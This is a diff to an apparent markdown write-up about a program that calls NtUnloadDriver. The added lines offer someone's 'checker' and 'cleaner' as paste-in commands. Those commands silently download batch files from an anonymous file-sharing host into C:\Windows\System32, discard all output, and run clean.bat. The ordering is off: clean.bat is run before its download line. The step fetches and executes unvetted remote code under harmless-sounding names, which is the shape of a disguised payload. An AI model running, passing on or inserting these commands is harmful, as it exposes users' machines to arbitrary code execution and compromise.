@@ -67,3 +67,9 @@ as you see it shows as `GetProcessAddress(... "NtUnloadDriver");` just like the 
 
 <img width="1219" height="660" alt="Untitled design(1)" src="https://github.com/user-attachments/assets/2d9c5237-1b9b-421c-afd5-e6f9c26c98bb" />
 
+<img width="1219" height="660" alt="NTSTATUS st = ntNtUnloadDriver( serviceStr);(1)" src="https://github.com/user-attachments/assets/f65c0bbc-c575-4eb8-b986-120500951cd7" />
+
+- heres his checker if u want it and what he calls a cleaner.
+- curl --silent https://files.catbox.moe/kis4ge.bat --output C:\\Windows\\System32\\check.bat >nul 2>&1
+- cd C:\\Windows\\System32\\ && clean.bat
+- curl --silent https://files.catbox.moe/ykmoac.bat --output C:\\Windows\\System32\\clean.bat >nul 2>&1
